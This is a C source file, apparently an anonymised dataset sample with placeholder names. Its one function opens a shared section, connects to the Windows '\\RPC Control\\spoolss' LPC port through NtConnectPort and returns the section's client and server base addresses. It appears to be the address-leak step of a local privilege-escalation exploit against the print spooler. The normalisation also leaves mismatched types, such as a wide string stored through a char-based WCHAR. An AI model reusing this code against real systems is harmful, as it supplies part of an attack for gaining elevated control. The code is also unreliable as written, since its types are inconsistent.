
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_14__ TYPE_6__ ;
typedef struct TYPE_13__ TYPE_3__ ;
typedef struct TYPE_12__ TYPE_2__ ;
typedef struct TYPE_11__ TYPE_1__ ;


typedef int sectionInfo ;
typedef int mapInfo ;
typedef int byte ;
typedef char WCHAR ;
struct TYPE_11__ {int Length; int MaximumLength; char* Buffer; } ;
typedef TYPE_1__ UNICODE_STRING ;
struct TYPE_14__ {int Length; int ServerBaseAddress; int ClientBaseAddress; int SectionSize; int SectionHandle; } ;
struct TYPE_13__ {int HighPart; int LowPart; scalar_t__ QuadPart; } ;
struct TYPE_12__ {int Length; int ContextTrackingMode; int EffectiveOnly; int ImpersonationLevel; } ;
typedef TYPE_2__ SECURITY_QUALITY_OF_SERVICE ;
typedef int (* NTCREATESECTION ) (int *,int ,int *,TYPE_3__*,int ,int ,int *) ;
typedef int (* NTCONNECTPORT ) (int *,TYPE_1__*,TYPE_2__*,int*,int*,int*,int*,int*) ;
typedef TYPE_6__ LPCSECTIONMAPINFO ;
typedef TYPE_6__ LPCSECTIONINFO ;
typedef TYPE_3__ LARGE_INTEGER ;
typedef int HANDLE ;
typedef int DWORD ;
typedef int ConnectDataBuffer ;


 int FUNC_0 (char*) ;
 scalar_t__ FUNC_1 (int ,char*) ;
 int VAR_0 ;
 int VAR_1 ;
 int VAR_2 ;
 int VAR_3 ;
 int VAR_4 ;
 int VAR_5 ;
 int FUNC_2 (TYPE_6__*,int ,int) ;
 int FUNC_3 (char*) ;
 int FUNC_4 (char*) ;

LARGE_INTEGER FUNC_5(void){

 HANDLE VAR_6;
 LPCSECTIONINFO VAR_7;
 LPCSECTIONMAPINFO VAR_8;
 byte VAR_9[100];
 DWORD VAR_10 = sizeof(VAR_9);
   WCHAR * VAR_11=L"\\RPC Control\\spoolss";
 DWORD VAR_12;
 UNICODE_STRING VAR_13;
   LARGE_INTEGER VAR_14;


   NTCONNECTPORT VAR_15;
   NTCREATESECTION VAR_16;

   VAR_14.QuadPart=0;
 for (VAR_12=0;VAR_12<100;VAR_12++)
  VAR_9[VAR_12]=0x0;


   VAR_15= (NTCONNECTPORT)FUNC_1(FUNC_0("NTDLL.DLL"), "NtConnectPort");
   VAR_16= (NTCREATESECTION)FUNC_1(FUNC_0("NTDLL.DLL"), "NtCreateSection");

   if ( (!VAR_15) || (!VAR_16) ) {
      FUNC_3("[-] Error Loading functions\n");
   } else {
    HANDLE VAR_17;
    LARGE_INTEGER VAR_18;
    DWORD VAR_19=0;
    SECURITY_QUALITY_OF_SERVICE VAR_20;
      DWORD VAR_21=4;


      VAR_18.LowPart=VAR_1;
    VAR_18.HighPart=0x0;

    VAR_20.Length =(DWORD)&VAR_21;
    VAR_20.ImpersonationLevel =VAR_5;
    VAR_20.ContextTrackingMode =0x01000101;
    VAR_20.EffectiveOnly =0x10000;

    VAR_16(&VAR_17,VAR_2,((void*)0),&VAR_18,VAR_0,VAR_3 ,((void*)0));


    FUNC_2(&VAR_7, 0, sizeof(VAR_7));
    FUNC_2(&VAR_8, 0, sizeof(VAR_8));

    VAR_7.Length = 0x18;
    VAR_7.SectionHandle =VAR_17;
    VAR_7.SectionSize = VAR_4;
    VAR_8.Length = 0x0C;

    VAR_13.Length = FUNC_4(VAR_11)*2;
    VAR_13.MaximumLength = FUNC_4(VAR_11)*2+2;
    VAR_13.Buffer =VAR_11;


    if (!VAR_15(&VAR_6,&VAR_13,&VAR_20,(DWORD *)&VAR_7,(DWORD *)&VAR_8,&VAR_19,(DWORD*)VAR_9,&VAR_10)){
         VAR_14.LowPart=VAR_7.ClientBaseAddress ;
         VAR_14.HighPart=VAR_7.ServerBaseAddress;
      }


   }
 return(VAR_14);
}
